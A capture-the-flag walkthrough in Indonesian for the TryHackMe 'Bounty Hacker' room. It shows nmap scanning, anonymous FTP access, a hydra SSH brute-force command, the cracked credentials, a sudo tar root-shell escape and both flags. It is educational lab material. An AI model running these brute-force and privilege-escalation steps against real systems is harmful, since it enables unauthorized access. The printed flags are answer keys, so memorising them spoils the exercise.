Lakukan scanning dengan `nmap`

```shell
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.54.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

Terdapat 3 port yang terbuka, yaitu 21, 22, dan 80.

Selanjutnya coba login ke ftp port dengan `anonymous` user

```shell
ftp IP-Target
```

lalu kita `ls`, dan nantinya akan ada 2 file dalam server ftp. kita dapat mengambil file tersebut dengan cara

```shell
get locks.txt
get task.txt
```

Isi dari `task.txt` dapat dibaca, dan isi dari `locks.txt` spertinya merupakan password. Selanjutnya kita bisa brute force ke ssh dengan menggunakan `hydra`. kita dapat membuat list potensial nama user dari yang ada di website, dan ditambah dari task.txt

```shell
nano potusr.txt

lin
spike
jet
edward
ed
ein
faye
peppers
beef
```

Selanjutnya kita dapat mulai brute force dengan cara

```shell
hydra -V -L potusr.txt -P locks.txt 10.10.244.3 ssh -t 4
```

Hasil bruteforce `hydra`

```
lin:RedDr4gonSynd1cat3
```

Kita dapat login dengan creds tersebut.

```shell
ssh lin@IP

Password:RedDr4gonSynd1cat3
```

Selanjutnya kita dapat melihat isi dari flag pertama di direktori saat kita login

```shell
cat user.txt

THM{CR1M3_SyNd1C4T3}
```

Untuk mendapat privesc dan root flag, kita dapat menggunakan SUID. Kita dapat cek dengan cara `sudo -l`, dan hasilnya:

```shell
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

maka kita bisa ke [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) untuk dapat keluar dari binary restricted shell. Dalam hal ini, kita dapat memanfaatkan tar

```shell
sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
```

ketika di enter, maka nantinya kita akan mendapat root shell, maka kita dapat melihat root flag.

```shell
cat /root/root.txt

THM{80UN7Y_h4cK3r}
```

